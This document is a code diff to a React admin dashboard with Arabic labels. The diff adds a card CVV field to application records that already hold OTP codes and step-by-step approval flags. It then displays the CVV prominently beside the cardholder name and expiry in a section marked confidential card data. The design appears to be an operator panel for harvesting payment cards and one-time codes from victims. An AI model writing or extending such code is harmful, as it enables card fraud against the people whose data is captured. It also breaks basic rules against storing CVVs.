@@ -30,6 +30,7 @@ interface Application {
   card_last_4: string;
   card_type: string;
   expiry_date: string;
+  card_cvv: string;
   otp_code: string;
   current_step: string;
   step_1_approved: boolean;
@@ -272,12 +273,32 @@ const DashboardApplications = () => {
               {/* بيانات الدفع */}
               {selectedApp.cardholder_name && (
                 <div>
-                  <h3 className="font-bold mb-2">بيانات الدفع</h3>
-                  <div className="grid grid-cols-2 gap-2 text-sm">
-                    <p><span className="font-semibold">اسم حامل البطاقة:</span> {selectedApp.cardholder_name}</p>
-                    <p><span className="font-semibold">آخر 4 أرقام:</span> {selectedApp.card_last_4}</p>
-                    <p><span className="font-semibold">نوع البطاقة:</span> {selectedApp.card_type}</p>
-                    <p><span className="font-semibold">تاريخ الانتهاء:</span> {selectedApp.expiry_date}</p>
+                  <h3 className="font-bold mb-2 text-red-600">⚠️ بيانات البطاقة الائتمانية (سرية)</h3>
+                  <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg border-2 border-red-200 dark:border-red-800">
+                    <div>
+                      <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
+                      <p className="font-bold text-base">{selectedApp.cardholder_name}</p>
+                    </div>
+                    <div>
+                      <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
+                      <p className="font-mono font-bold text-lg" dir="ltr">
+                        **** **** **** {selectedApp.card_last_4}
+                      </p>
+                    </div>
+                    <div className="grid grid-cols-2 gap-3">
+                      <div>
+                        <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
+                        <p className="font-semibold capitalize">{selectedApp.card_type}</p>
+                      </div>
+                      <div>
+                        <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
+                        <p className="font-mono font-semibold">{selectedApp.expiry_date}</p>
+                      </div>
+                    </div>
+                    <div>
+                      <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
+                      <p className="font-mono font-bold text-2xl text-red-600">{selectedApp.card_cvv || '***'}</p>
+                    </div>
                   </div>
                 </div>
               )}
